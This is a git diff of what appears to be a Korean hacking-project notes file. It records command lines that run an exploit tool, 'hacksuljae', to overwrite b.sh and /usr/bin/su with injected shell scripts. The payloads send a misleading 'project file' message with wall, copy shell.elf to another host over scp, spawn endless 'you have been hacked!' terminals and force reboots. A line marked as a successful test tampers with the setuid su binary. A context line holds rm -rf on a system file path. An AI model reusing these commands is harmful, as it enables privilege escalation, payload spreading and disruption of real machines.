@@ -20,3 +20,11 @@ rm -rf "시스템파일 경로"
 ./hacksuljae /home/user1/Desktop/b.sh 1 $'#!/bin/bash\naaa=\"Hi User2, I\'m User1 I send a file. That file is the executable file associated with our project. Please check this file in your Desktop\"\nwall $aaa;\nscp \"/home/user1/Downloads/my/hacksuljae.c\" \"user2@192.168.59.138:/home/user2/Desktop\"\n/home/user1/Downloads/my/3d375d0ead2b63168de86ca2649360d9dcff75b3e0ffa2cf1e50816ec92b3b7d.elf\nwhile true; do\ngnome-terminal -- bash -c \'echo \"you have been hacked!\"; read -p \"Press Enter to continue or \"\'\ndone\nsleep 10\nreboot\n//'
 
 ./hacksuljae /home/user1/Desktop/b.sh 1 $'#!/bin/bash\naaa=\"Hi User2, I\'m User1 I send a file. That file is the executable file associated with our project. Please check this file in your Desktop\"\nwall $aaa;\nscp \"/home/user1/Downloads/shell.elf\" \"user2@192.168.59.139:/home/user2/Desktop\"\nwhile true; do\ngnome-terminal -- bash -c \'echo \"you have been hacked!\"; read -p \"Press Enter to continue or \"\'\ndone\nsleep 10\nreboot\n//'
+
+------------------------------------------------------
+검수필요
+./hacksuljae /usr/bin/su 1 $'#!/bin/bash\naaa=\"Hi User2, I\'m User1 I send a file. That file is the executable file associated with our project. Please check this file in your Desktop\"\nwall $aaa;\nscp \"/home/user1/Downloads/shell.elf\" \"user2@192.168.59.139:/home/user2/Desktop\"\nshutdown -r +1\nwhile true; do\ngnome-terminal -- bash -c \'echo \"you have been hacked!\"; read -p \"Press Enter to continue or \"\'\ndone\n//' && sed -i '1d' /usr/bin/su
+
+-----------------------
+test성공
+./hacksuljae /usr/bin/su 1 $'#!/bin/bash\nwhile true; do\ngnome-terminal -- bash -c \'echo \"you have been hacked!\"; read -p \"Press Enter to continue or \"\'\ndone\n//' && sed -i '1d' /usr/bin/su
